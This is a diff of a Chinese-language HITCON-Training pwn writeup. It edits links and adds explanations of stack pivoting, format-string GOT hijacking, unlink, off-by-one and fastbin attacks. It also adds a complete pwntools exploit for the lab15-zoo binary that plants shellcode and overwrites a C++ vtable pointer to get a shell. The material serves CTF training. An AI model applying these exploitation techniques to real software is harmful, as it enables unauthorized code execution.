@@ -1,10 +1,9 @@
 # HITCON-Training-Writeup
 
-> 原文链接[M4x@10.0.0.55](http://www.cnblogs.com/WangAoBo/p/8570640.html)
+> ~~原文链接[M4x@10.0.0.55](http://www.cnblogs.com/WangAoBo/p/8570640.html)~~
+> 原文链接[M4x@10.0.0.55](https://github.com/0x01f/HITCON-Training-Writeup)
 
 > 项目地址[M4x's github](https://github.com/0x01f/HITCON-Training-Writeup)，欢迎 star~
-
-> 更新时间5月16
 
 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.com/scwuaptx/HITCON-Training
 
@@ -414,9 +413,9 @@ io.close()
       exit(1);
   ```
 
-  限制了我们只能利用一次 main 函数的溢出（直接控制 main 返回到 exit 后的话，程序的栈结构会乱掉）
+  限制了我们只能利用一次 main 函数的溢出
 
-所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 [**slide**](https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A)
+所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 [**slide**](https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A), 在 [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting) 上对 stack-pivot 也有很清楚的介绍
 
 ![stackPivot](https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg)
 
@@ -473,7 +472,7 @@ io.interactive()
 io.close()
 ```
 
-稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以为所欲为了。
+稍微解释一下，先通过主函数中可以控制的 20 个字节将 esp 指针劫持到可控的 bss 段，然后就可以为所欲为了。
 
 关于 stack-pivot，pwnable.kr 的 simple\_login 是很经典的题目，放上一篇这道题的很不错的 [**wp**](https://blog.csdn.net/yuanyunfeng3/article/details/51456049)
 
@@ -482,7 +481,7 @@ io.close()
 
 ### lab7-crack
 
-输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts\_got 到 system("cat flag") 处（注意 printf 实际调用了 puts）
+输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts\_got 到 system("cat flag") 处（注意此处 printf 实际调用了 puts）
 
 ```python
 lab7 [master●●] cat hijack.py 
@@ -940,7 +939,7 @@ if __name__ == "__main__":
 >
 > 识别出结构体的具体结构后
 >
-> - shift+F1, insert 插入识别出的结果
+> - shift + F1, insert 插入识别出的结果
 >
 >   ![](http://ww1.sinaimg.cn/large/006AWYXBly1fq30oi6hn6j30qt0hgjsc.jpg)
 >
@@ -1015,7 +1014,7 @@ if __name__ == "__main__":
 
 #### unlink
 
-至于 unlink，在这个 [slide](https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf)中有较大篇幅的介绍，就不在说明原理了
+至于 unlink，在这个 [slide](https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf)中有较大篇幅的介绍，就不再说明原理了. 需要说明的一点是在最近的几次比赛中经常见到 off-by-one null 经常与 unlink 连用, 通过 off-by-one null 修改下一个 chunk 的 size, 通过精心布局的 chunk 来 leak got 和修改 got, 这几乎也成了一种固定的套路
 
 ```python
 lab11 [master●] cat unlink.py 
@@ -1147,6 +1146,7 @@ if __name__ == "__main__":
 
 > 以上的 exp 实现了通过 fastbin attack 来修改 got, 实际上通过 fastbin attack 来修改 \_\_malloc\_hook, \_\_realloc\_hook, \_\_free\_hook, IO\_file\_plus 结构体中的 jump\_table 也是很常见的做法, 尤其是程序开了 Full Relro 保护时
 > pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考这篇 [writeup](http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/)
+> pwndbg 有一个寻找 fastbin 可行地址的功能, 但不是太好用, 我借鉴了 [veritas501](https://veritas501.space/2018/03/27/调教pwndbg/) 师傅的代码, 完成了一个快速寻找, 在我 fork 的 [Pwngdb](https://github.com/0x01f/Pwngdb) 也添加了这一功能
 
 
 ### lab13-heapcreator
@@ -1269,4 +1269,43 @@ if __name__ == "__main__":
 
 ### lab15-zoo
 [pwn in C++](https://github.com/M4xW4n9/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf)
+'''python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
 
+from pwn import *
+context.log_level = "debug"
+context.binary = "./zoo"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
+def addDog(name, weight):
+    io.sendlineafter(":", "1")
+    io.sendlineafter(":", name)
+    io.sendlineafter(":", str(weight))
+
+def remove(idx):
+    io.sendlineafter(":", "5")
+    io.sendlineafter(":", str(idx))
+
+def listen(idx):
+    io.sendlineafter(":", "3")
+    io.sendlineafter(":", str(idx))
+
+if __name__ == "__main__":
+    io = process("./zoo")
+    nameofzoo = 0x605420
+
+    sc = asm(shellcraft.sh())
+    io.sendlineafter(":", sc + p64(nameofzoo))
+
+    addDog('0' * 8, 0)
+    addDog('1' * 8, 1)
+    remove(0)
+    vptr = nameofzoo + len(sc)
+    addDog('a' * 72 + p64(vptr), 2)
+    listen(0)
+
+    io.interactive()
+    io.close()
+'''
